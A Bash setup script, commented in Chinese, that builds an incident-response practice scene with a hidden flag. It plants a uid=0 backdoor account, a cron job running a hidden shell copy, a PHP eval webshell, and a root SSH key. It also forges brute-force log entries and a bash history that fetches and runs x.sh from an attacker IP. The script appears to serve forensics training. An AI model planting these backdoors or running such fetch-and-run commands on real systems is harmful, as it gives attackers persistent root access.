#!/bin/bash
# 场景装料脚本：模拟一台被入侵的 web 服务器（练习用，痕迹由本脚本布置）
set -e

ATTACKER=203.0.113.66

# 持久化 1：uid=0 后门账号
grep -q svc-backup /etc/passwd || echo 'svc-backup:x:0:0:backdoor account:/root:/bin/bash' >> /etc/passwd

# 持久化 2：cron 定时任务
mkdir -p /etc/cron.d
cat > /etc/cron.d/system-backup <<'EOF'
*/3 * * * * root /tmp/.sysupdate/.backup >/dev/null 2>&1
EOF

# 持久化 3：隐藏目录里的"备份"程序
mkdir -p /tmp/.sysupdate
cp /bin/dash /tmp/.sysupdate/.backup
chmod 755 /tmp/.sysupdate/.backup

# webshell
mkdir -p /var/www/html
cat > /var/www/html/wp-link.php <<'EOF'
<?php @eval($_POST['x']); ?>
EOF

# ssh 后门公钥
mkdir -p /root/.ssh
chmod 700 /root/.ssh
grep -q backup@off /root/.ssh/authorized_keys 2>/dev/null || \
  echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHZ4H4gHb8Nc9bg0uJvXnMbkKeyPwn3rD3m0 backup@off" >> /root/.ssh/authorized_keys

# 登录与暴力破解痕迹
touch /var/log/auth.log
cat >> /var/log/auth.log <<EOF
Mar 14 02:07:11 web-prod-01 sshd[1201]: Failed password for root from ${ATTACKER} port 51022 ssh2
Mar 14 02:07:14 web-prod-01 sshd[1201]: Failed password for root from ${ATTACKER} port 51024 ssh2
Mar 14 02:07:18 web-prod-01 sshd[1201]: Failed password for root from ${ATTACKER} port 51026 ssh2
Mar 14 02:07:23 web-prod-01 sshd[1201]: Failed password for admin from ${ATTACKER} port 51030 ssh2
Mar 14 02:07:31 web-prod-01 sshd[1215]: Accepted password for root from ${ATTACKER} port 51044 ssh2
Mar 14 02:08:02 web-prod-01 useradd[1230]: new user: name=svc-backup, UID=0, GID=0
Mar 14 02:09:47 web-prod-01 sudo: root : TTY=pts/1 ; PWD=/tmp ; COMMAND=/usr/bin/wget http://${ATTACKER}:8000/x.sh
EOF

# 操作者痕迹
cat > /root/.bash_history <<'EOF'
wget http://203.0.113.66:8000/x.sh
chmod +x x.sh && ./x.sh
mkdir -p /tmp/.sysupdate
cp /bin/dash /tmp/.sysupdate/.backup
unset HISTFILE
exit
EOF

# flag：应急报告里需要引用的答案之一（隐藏文件）
echo 'flag{ir_scene_2026_attacker_203.0.113.66}' > /tmp/.sysupdate/.flag
chmod 600 /tmp/.sysupdate/.flag

echo "[plant] scene ready: artifacts planted at $(date)"
